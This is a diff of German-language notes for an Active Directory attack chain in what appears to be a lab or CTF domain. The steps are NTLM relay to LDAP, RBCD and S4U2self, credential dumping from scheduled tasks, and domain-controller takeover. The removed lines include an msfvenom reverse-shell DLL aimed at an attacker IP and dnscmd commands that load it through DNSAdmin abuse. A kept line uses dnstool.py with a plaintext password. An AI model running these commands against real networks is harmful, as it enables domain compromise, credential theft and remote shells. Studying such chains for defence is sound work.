@@ -5,30 +5,9 @@
 4. HTTP Relay von SRV02 zu ldap://DC01
 5. RBCD um an SRV02$ zu kommen
 6. Mit SRV02$ local admin mit s4u2self magic
-7. Credential Dump von scheduled tasks um den DNS Admin user zu bekommen
-8. Mit admin privs den erbeuteten User local Admin machen auf SRV02 für command execution
-9. DNS attack auf DC01 um shell zu bekommen
-
-## DNS Exploit setup
-1. DNS Service auf SRV02 installieren, damit dnscmd.exe da ist
-2. Security Descriptor für DNS service aktualisieren für DNS Admins
-3. Auf DC dem reg key `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurePipeServers\SCM` "dns" hinzufügen, damit DNS Admins den DNS Service steuern können
-4. (DC Rebooten)
-
-Security Descriptor ACE:
-(A;;0x0034;;;<DNS ADMINS SID>)
-
-Registry key where DLL is loaded:
-`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll`
+7. Credential Dump von scheduled tasks um den High Priv user zu bekommen
+8. Mit High Priv user selbst zu Kontenoperatoren hinzufügen
+9. Mit Kontenoperatoren Passwort von DC01$ auf known Wert setzen
 
 ### Befehle
- * Generate malicious dll: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.108.128 LPORT=4444 -f dll -o pwn.dll`
- * Load DLL: `dnscmd.exe /config /serverlevelplugindll \\192.168.108.133\C\Windows\Temp\pwn.dll`
- * Stop DNS Service: `sc.exe \\DC01 stop dns`
- * Start DNS Service: `sc.exe \\DC01 start dns`
  * Add DNS entry: `python dnstool.py -u hack.lu\\ta_bort.mig -p 'LjtLNg37LdcZin73' ldaps://192.168.108.134 -port 636 -a add -r kali --data 192.168.108.128 -dns-ip 192.168.108.134`
- * Add user to local Admins: `net localgroup Administrators Øyvind.Dennison /add`
-
-## TODOs
-* DNSAdmin Scheduled Task mit Powershell
-* DNSAbuse testen
